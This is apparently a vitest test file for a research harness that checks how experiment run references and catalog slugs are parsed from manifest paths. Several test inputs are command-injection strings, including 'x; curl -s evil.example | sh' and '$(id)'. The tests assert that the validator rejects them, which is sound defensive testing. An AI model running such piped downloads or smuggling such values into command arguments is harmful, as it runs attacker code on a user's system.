import { describe, expect, it } from 'vitest'
import { catalogExperimentSlug, catalogRunReference } from './use-research-harness-experiment'

describe('catalog Run references', () => {
  it('recognizes current and legacy record trees on local or Windows paths', () => {
    expect(
      catalogRunReference({ manifestPath: '/project/.aster/experiments/lora/runs/seed-1/run.json' })
    ).toBe('lora/seed-1')
    expect(
      catalogRunReference({
        manifestPath: '/project/research/experiments/lora/runs/seed-2/run.json'
      })
    ).toBe('lora/seed-2')
    expect(
      catalogRunReference({
        manifestPath: 'C:\\project\\.aster\\experiments\\lora\\runs\\seed-3\\run.json'
      })
    ).toBe('lora/seed-3')
  })

  it('does not turn an unrelated manifest into a catalog Run', () => {
    expect(catalogRunReference({ manifestPath: '/project/results/seed-1/run.json' })).toBeNull()
    expect(catalogRunReference({ manifestPath: null })).toBeNull()
  })
})

describe('catalog names an agent runs commands with', () => {
  it('keeps slugs the harness accepts and drops ones that could break out of a command', () => {
    expect(catalogExperimentSlug({ catalogSlug: 'lora-r16' })).toBe('lora-r16')
    expect(catalogExperimentSlug({ catalogSlug: '실험-1' })).toBe('실험-1')
    expect(catalogExperimentSlug({ catalogSlug: 'x; curl -s evil.example | sh' })).toBeNull()
    expect(catalogExperimentSlug({ catalogSlug: '$(id)' })).toBeNull()
    expect(catalogExperimentSlug({ catalogSlug: undefined })).toBeNull()
  })

  it('drops a Run folder name the harness would refuse', () => {
    expect(
      catalogRunReference({
        manifestPath: '/project/research/experiments/x;id/runs/seed-1/run.json'
      })
    ).toBeNull()
    expect(
      catalogRunReference({
        manifestPath: '/project/research/experiments/lora/runs/$(id)/run.json'
      })
    ).toBeNull()
  })
})
